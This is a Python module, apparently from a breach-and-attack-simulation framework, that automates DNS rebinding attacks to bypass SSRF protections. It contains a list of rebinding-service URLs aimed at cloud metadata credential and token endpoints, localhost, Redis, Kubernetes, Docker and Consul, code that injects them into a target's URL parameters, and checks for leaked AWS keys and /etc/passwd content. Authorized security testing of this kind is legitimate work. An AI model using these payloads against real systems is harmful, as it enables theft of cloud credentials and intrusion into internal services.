"""
DNS Rebinding attack testing module.

Tests for TOCTOU (Time-of-Check to Time-of-Use) DNS rebinding vulnerabilities
where applications resolve hostnames twice - once for validation and once for
the actual request. An attacker-controlled DNS server alternates between
returning a safe IP and an internal IP, bypassing SSRF protections.

MITRE ATT&CK: T1071 - Application Layer Protocol
"""

from __future__ import annotations

import uuid
from typing import Any

from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus


# DNS rebinding payloads use services that alternate DNS responses between
# two IPs. The hex-encoded IPs are embedded in the subdomain.
# Format: <hex_internal_ip>.<hex_safe_ip>.<rebind_service>
# 7f000001 = 127.0.0.1, c0a80001 = 192.168.0.1, 0a000001 = 10.0.0.1
# a9fe a9fe = 169.254.169.254 (AWS metadata)

DNS_REBINDING_PAYLOADS = [
    # --- rbndr.us rebinding service (alternates between two IPs) ---
    # Rebind to localhost (127.0.0.1)
    "REBIND_LOCALHOST:http://7f000001.c0a80001.rbndr.us/",
    "REBIND_LOCALHOST:http://7f000001.0a000001.rbndr.us/",
    "REBIND_LOCALHOST:http://7f000001.ac100001.rbndr.us/",

    # Rebind to AWS metadata (169.254.169.254)
    "REBIND_AWS_META:http://a9fea9fe.c0a80001.rbndr.us/latest/meta-data/",
    "REBIND_AWS_META:http://a9fea9fe.0a000001.rbndr.us/latest/meta-data/iam/security-credentials/",
    "REBIND_AWS_META:http://a9fea9fe.ac100001.rbndr.us/latest/user-data",

    # Rebind to common internal IPs
    "REBIND_INTERNAL:http://0a000001.c0a80001.rbndr.us/",
    "REBIND_INTERNAL:http://c0a80001.0a000001.rbndr.us/",
    "REBIND_INTERNAL:http://ac100001.c0a80001.rbndr.us/",

    # --- 1u.ms rebinding service ---
    # Rebind to localhost
    "REBIND_LOCALHOST_1U:http://make-127.0.0.1-rebind-169.254.169.254-rr.1u.ms/",
    "REBIND_LOCALHOST_1U:http://make-127.0.0.1-rebind-10.0.0.1-rr.1u.ms/",

    # --- lock.cmpxchg8b.com rebinding service ---
    "REBIND_LOCK:http://lock.cmpxchg8b.com/rebind/127.0.0.1/10.0.0.1",

    # --- Targeting internal services via rebind ---
    # Redis on localhost
    "REBIND_REDIS:http://7f000001.c0a80001.rbndr.us:6379/",
    # Elasticsearch on localhost
    "REBIND_ELASTIC:http://7f000001.c0a80001.rbndr.us:9200/",
    # Kubernetes API
    "REBIND_K8S:http://7f000001.c0a80001.rbndr.us:10250/pods",
    # Docker socket
    "REBIND_DOCKER:http://7f000001.c0a80001.rbndr.us:2375/containers/json",
    # Consul
    "REBIND_CONSUL:http://7f000001.c0a80001.rbndr.us:8500/v1/agent/members",

    # --- GCP metadata via rebind ---
    "REBIND_GCP_META:http://a9fea9fe.c0a80001.rbndr.us/computeMetadata/v1/project/project-id",
    "REBIND_GCP_META:http://a9fea9fe.c0a80001.rbndr.us/computeMetadata/v1/instance/service-accounts/default/token",

    # --- Azure metadata via rebind ---
    "REBIND_AZURE_META:http://a9fea9fe.c0a80001.rbndr.us/metadata/instance?api-version=2021-02-01",

    # --- Timing-based rebinding (short TTL) ---
    # These test if the app caches DNS or resolves twice
    "REBIND_TTL_SHORT:http://7f000001.c0a80001.rbndr.us/?cachebust=BAS_REBIND_TTL",
    "REBIND_TTL_SHORT:http://a9fea9fe.c0a80001.rbndr.us/?cachebust=BAS_REBIND_TTL",

    # --- Rebind with non-standard ports ---
    "REBIND_PORT_80:http://7f000001.c0a80001.rbndr.us:80/admin",
    "REBIND_PORT_443:http://7f000001.c0a80001.rbndr.us:443/",
    "REBIND_PORT_8080:http://7f000001.c0a80001.rbndr.us:8080/",
    "REBIND_PORT_3000:http://7f000001.c0a80001.rbndr.us:3000/",
    "REBIND_PORT_8443:http://7f000001.c0a80001.rbndr.us:8443/",
]


class DNSRebindingModule(BaseAttackModule):
    """
    DNS Rebinding attack testing.

    Tests for TOCTOU vulnerabilities where an application validates a hostname
    against an allowlist/blocklist, then makes a second DNS resolution for the
    actual request. A rebinding DNS server alternates responses, causing the
    second resolution to return an internal/attacker-controlled IP.

    Common vulnerable patterns:
    - URL validators that resolve DNS separately from the HTTP client
    - Webhook/callback URL validation
    - Image/file fetch from user-supplied URLs
    - OAuth redirect_uri validation
    """

    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(
            name="dns_rebinding",
            description="DNS Rebinding - TOCTOU attacks bypassing SSRF protections via DNS re-resolution",
            category="dns_rebinding",
            mitre_technique_ids=["T1071", "T1090"],
            mitre_technique_names=["Application Layer Protocol", "Proxy"],
            auth_level_required=AuthorizationLevel.STANDARD,
            owasp_category="A10:2021 - Server-Side Request Forgery",
            cwe_ids=["CWE-350", "CWE-367", "CWE-918"],
            tags=["dns", "rebinding", "ssrf", "toctou", "bypass"],
        )

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        payloads = list(DNS_REBINDING_PAYLOADS)

        # If a callback domain is provided, add custom rebind payloads
        callback_domain = options.get("callback_domain")
        if callback_domain:
            payloads.append(f"REBIND_CALLBACK:http://{callback_domain}/rebind-test")

        # If custom internal targets are specified, generate rebind payloads for them
        internal_targets = options.get("internal_targets", [])
        for internal_ip in internal_targets:
            hex_ip = "".join(f"{int(octet):02x}" for octet in internal_ip.split("."))
            payloads.append(f"REBIND_CUSTOM:http://{hex_ip}.c0a80001.rbndr.us/")

        if self._payload_db:
            db_payloads = await self._payload_db.get_payloads("dns_rebinding", limit=50)
            if db_payloads:
                payloads.extend(db_payloads)

        return payloads

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        requests = []
        inject_params = options.get("params", [
            "url", "uri", "link", "callback", "webhook",
            "redirect", "src", "href", "fetch", "load",
        ])
        path = options.get("path", "/")
        method = options.get("method", "GET")

        for payload in payloads:
            attack_type, rebind_url = payload.split(":", 1) if ":" in payload else ("UNKNOWN", payload)

            for param in inject_params:
                req_id = uuid.uuid4().hex[:8]

                if method.upper() == "POST":
                    requests.append(AttackRequest(
                        request_id=f"rebind-{req_id}",
                        target=target,
                        method="POST",
                        path=path,
                        body=f"{param}={rebind_url}",
                        content_type="application/x-www-form-urlencoded",
                        headers={
                            "X-BAS-Payload": payload,
                            "X-BAS-Attack-Type": attack_type,
                        },
                        timeout=options.get("timeout", 45.0),
                        follow_redirects=False,
                    ))
                else:
                    requests.append(AttackRequest(
                        request_id=f"rebind-{req_id}",
                        target=target,
                        method="GET",
                        path=path,
                        params={param: rebind_url},
                        headers={
                            "X-BAS-Payload": payload,
                            "X-BAS-Attack-Type": attack_type,
                        },
                        timeout=options.get("timeout", 45.0),
                        follow_redirects=False,
                    ))

        return requests

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        body = response.body_text
        attack_type = request.headers.get("X-BAS-Attack-Type", "UNKNOWN")
        payload_used = request.headers.get("X-BAS-Payload", payload)

        # AWS metadata indicators
        aws_indicators = [
            ("ami-id", "AWS EC2 metadata accessible via DNS rebinding"),
            ("instance-id", "AWS instance metadata accessible via DNS rebinding"),
            ("security-credentials", "AWS IAM credentials accessible via DNS rebinding"),
            ("AccessKeyId", "AWS access key exposed via DNS rebinding"),
            ("SecretAccessKey", "AWS secret key exposed via DNS rebinding"),
            ("iam", "AWS IAM data accessible via DNS rebinding"),
        ]
        for indicator, desc in aws_indicators:
            if indicator in body:
                return ModuleResult(
                    module_name="dns_rebinding",
                    target=request.target,
                    status=VulnStatus.VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"DNS Rebinding: {desc} - '{indicator}' found in response",
                    severity="critical",
                    mitre_technique_id="T1071",
                    detail={"detection_type": "cloud_metadata_rebind", "attack_type": attack_type},
                )

        # GCP metadata indicators
        if "computeMetadata" in body or "project-id" in body:
            return ModuleResult(
                module_name="dns_rebinding",
                target=request.target,
                status=VulnStatus.VULNERABLE,
                payload_used=payload_used,
                response_code=response.status_code,
                response_body_preview=body[:500],
                elapsed_ms=response.elapsed_ms,
                evidence="DNS Rebinding: GCP metadata accessible via DNS rebinding",
                severity="critical",
                mitre_technique_id="T1071",
                detail={"detection_type": "gcp_metadata_rebind", "attack_type": attack_type},
            )

        # Internal service indicators
        internal_indicators = [
            ("redis_version", "Redis accessible via DNS rebinding", "high"),
            ("elasticsearch", "Elasticsearch accessible via DNS rebinding", "high"),
            ("kubelet", "Kubernetes API accessible via DNS rebinding", "critical"),
            ("Containers", "Docker API accessible via DNS rebinding", "critical"),
            ("consul", "Consul accessible via DNS rebinding", "high"),
            ("root:x:0:0", "/etc/passwd accessible via DNS rebinding", "critical"),
        ]
        for indicator, desc, severity in internal_indicators:
            if indicator.lower() in body.lower():
                return ModuleResult(
                    module_name="dns_rebinding",
                    target=request.target,
                    status=VulnStatus.VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"DNS Rebinding: {desc}",
                    severity=severity,
                    mitre_technique_id="T1071",
                    detail={"detection_type": "internal_service_rebind", "attack_type": attack_type},
                )

        # Generic rebind success indicators - the app fetched internal content
        if attack_type.startswith("REBIND_") and response.status_code == 200:
            body_lower = body.lower()
            # Check if the response contains content that looks internal
            internal_content_hints = [
                "internal", "intranet", "admin", "dashboard",
                "private", "config", "database", "credentials",
            ]
            for hint in internal_content_hints:
                if hint in body_lower and len(body) > 50:
                    return ModuleResult(
                        module_name="dns_rebinding",
                        target=request.target,
                        status=VulnStatus.POTENTIALLY_VULNERABLE,
                        payload_used=payload_used,
                        response_code=response.status_code,
                        response_body_preview=body[:500],
                        elapsed_ms=response.elapsed_ms,
                        evidence=f"DNS Rebinding: potential internal content via rebinding ('{hint}' in response)",
                        severity="medium",
                        mitre_technique_id="T1071",
                        detail={"detection_type": "potential_rebind", "attack_type": attack_type, "hint": hint},
                    )

        # Timing-based detection: if the response is significantly delayed,
        # it might indicate DNS was resolved multiple times
        if "TTL" in attack_type and response.elapsed_ms > 5000:
            return ModuleResult(
                module_name="dns_rebinding",
                target=request.target,
                status=VulnStatus.POTENTIALLY_VULNERABLE,
                payload_used=payload_used,
                response_code=response.status_code,
                elapsed_ms=response.elapsed_ms,
                evidence=f"DNS Rebinding: high latency ({response.elapsed_ms:.0f}ms) suggests multiple DNS resolutions",
                severity="low",
                mitre_technique_id="T1071",
                detail={"detection_type": "timing_anomaly", "attack_type": attack_type},
            )

        return ModuleResult(
            module_name="dns_rebinding",
            target=request.target,
            status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload_used,
            response_code=response.status_code,
            elapsed_ms=response.elapsed_ms,
            detail={"attack_type": attack_type},
        )
